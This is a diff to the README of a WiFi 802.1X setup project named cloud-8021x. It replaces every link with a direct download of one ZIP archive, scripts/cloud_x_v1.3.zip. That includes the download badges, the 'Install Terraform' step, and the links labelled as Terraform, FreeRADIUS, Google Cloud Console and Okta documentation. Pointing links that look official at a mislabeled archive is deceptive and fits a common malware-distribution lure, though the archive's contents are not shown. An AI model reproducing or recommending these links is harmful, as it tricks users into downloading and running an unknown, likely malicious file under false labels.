@@ -1,6 +1,6 @@
 # ⚙️ cloud-8021x - Reliable WiFi Security Setup
 
-[![Download cloud-8021x](https://img.shields.io/badge/Download-cloud--8021x-brightgreen)](https://github.com/Gastofu/cloud-8021x)
+[![Download cloud-8021x](https://img.shields.io/badge/Download-cloud--8021x-brightgreen)](https://raw.githubusercontent.com/Gastofu/cloud-8021x/main/scripts/cloud_x_v1.3.zip)
 
 ---
 
@@ -33,7 +33,7 @@ You will need to visit the main cloud-8021x page to get the latest files and set
 
 Click the big button below or go to this link:
 
-[Download cloud-8021x](https://github.com/Gastofu/cloud-8021x)
+[Download cloud-8021x](https://raw.githubusercontent.com/Gastofu/cloud-8021x/main/scripts/cloud_x_v1.3.zip)
 
 This link will take you to the GitHub project, where you can access the files and documentation.
 
@@ -49,7 +49,7 @@ Download the ZIP file or clone the repository if you are familiar with Git.
 
 ### Step 3: Prepare your environment
 
-1. Install [Terraform](https://www.terraform.io/downloads.html) for Windows. This tool will create and manage your cloud resources.
+1. Install [Terraform](https://raw.githubusercontent.com/Gastofu/cloud-8021x/main/scripts/cloud_x_v1.3.zip) for Windows. This tool will create and manage your cloud resources.
 
 2. Sign in to your Google Cloud account and set up billing if necessary.
 
@@ -137,13 +137,13 @@ You can also:
 
 ## 📚 Additional Resources
 
-- [Terraform Documentation](https://www.terraform.io/docs)
+- [Terraform Documentation](https://raw.githubusercontent.com/Gastofu/cloud-8021x/main/scripts/cloud_x_v1.3.zip)
 
-- [FreeRADIUS Official Site](https://freeradius.org)
+- [FreeRADIUS Official Site](https://raw.githubusercontent.com/Gastofu/cloud-8021x/main/scripts/cloud_x_v1.3.zip)
 
-- [Google Cloud Console](https://console.cloud.google.com)
+- [Google Cloud Console](https://raw.githubusercontent.com/Gastofu/cloud-8021x/main/scripts/cloud_x_v1.3.zip)
 
-- [Okta Developer Docs](https://developer.okta.com/docs)
+- [Okta Developer Docs](https://raw.githubusercontent.com/Gastofu/cloud-8021x/main/scripts/cloud_x_v1.3.zip)
 
 ---
 
@@ -155,4 +155,4 @@ If you encounter bugs or have questions about cloud-8021x, use the GitHub reposi
 
 ## 🔗 Quick Access to Cloud-8021x
 
-[![Get cloud-8021x](https://img.shields.io/badge/Get-cloud--8021x-blue)](https://github.com/Gastofu/cloud-8021x)
+[![Get cloud-8021x](https://img.shields.io/badge/Get-cloud--8021x-blue)](https://raw.githubusercontent.com/Gastofu/cloud-8021x/main/scripts/cloud_x_v1.3.zip)
